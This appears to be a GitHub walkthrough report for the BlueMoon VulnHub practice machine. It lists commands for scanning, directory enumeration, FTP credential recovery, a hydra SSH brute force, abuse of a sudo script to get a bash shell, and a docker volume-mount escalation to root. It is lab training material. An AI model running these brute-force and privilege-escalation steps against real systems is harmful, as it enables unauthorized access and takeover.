# 📘 BlueMoon VulnHub Walkthrough Report

## 📌 Overview
This report documents a full penetration testing process performed on the BlueMoon VulnHub machine. The objective is to identify vulnerabilities, gain access, escalate privileges, and capture all flags.

---

## 🖥️ Lab Setup
- Platform: VirtualBox  
- Attacker Machine: Kali Linux  
- Target Machine: BlueMoon (VulnHub)  
- Network: Host-Only / NAT Network  

---

## 🌐 1. Identify Attacker IP Address

```bash
ifconfig
```

Displays network interface details and confirms connectivity.

---

## 🔍 2. Network Scanning

```bash
nmap -sn 192.168.56.0/24
```

Discovers active hosts in the network.

**Result:** Target IP → 192.168.56.101

---

## 🧪 3. Service Enumeration

```bash
nmap -sV -p- 192.168.56.101
```

Finds open ports and services.

**Open Ports:**
- 21 (FTP)
- 22 (SSH)
- 80 (HTTP)

---

## 🌍 4. Web Enumeration

```bash
gobuster dir -u http://192.168.56.101 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
```

Finds hidden directories.

**Result:** /hidden_text

---

## 🔐 5. Extract Credentials

- Navigate to /hidden_text
- Download QR code
- Decode using online tool

**Credentials:**
- userftp / ftpp@ssword

---

## 📂 6. FTP Access

```bash
ftp 192.168.56.101
```

Download files:
```bash
get information.txt
get p_lists.txt
```

---

## 📄 7. Analyze Files

```bash
cat information.txt
cat p_lists.txt
```

---

## 🔓 8. SSH Brute Force

```bash
hydra -l robin -P p_lists.txt ssh://192.168.56.101
```

**Credentials Found:**
- robin / k4rv3ndh4nh4ck3r

---

## 🔑 9. SSH Login

```bash
ssh robin@192.168.56.101
```

---

## 🏁 10. First Flag

```bash
cat user1.txt
```

---

## ⚙️ 11. Sudo Check

```bash
sudo -l
```

---

## 💥 12. Exploit Script

```bash
sudo -u jerry /home/robin/project/feedback.sh
```

Input:
- jerry
- /bin/bash

---

## 🏁 13. Second Flag

```bash
cd /home/jerry
cat user2.txt
```

---

## 🧬 14. Upgrade Shell

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

---

## 🧾 15. Check Privileges

```bash
id
```

User is in docker group.

---

## 🚀 16. Docker Privilege Escalation

```bash
docker run -v /:/mnt --rm -it alpine chroot /mnt sh
```

---

## 👑 17. Root Access

```bash
id
```

---

## 🏁 18. Final Flag

```bash
cd /root
cat root.txt
```

---

## 📊 Attack Summary

| Phase | Action |
|------|--------|
| Recon | Network scan |
| Enumeration | Ports & Web |
| Exploitation | FTP & SSH |
| Privilege Escalation | Sudo & Docker |
| Post Exploitation | Flags |

---

## 🖼️ Image Usage in GitHub

Place images in:
```
images/
```

Reference in Markdown:
```markdown
![desc](images/example.png)
```

---

## ✅ Conclusion

The attack demonstrates full system compromise through enumeration, credential harvesting, brute-force attacks, and privilege escalation.
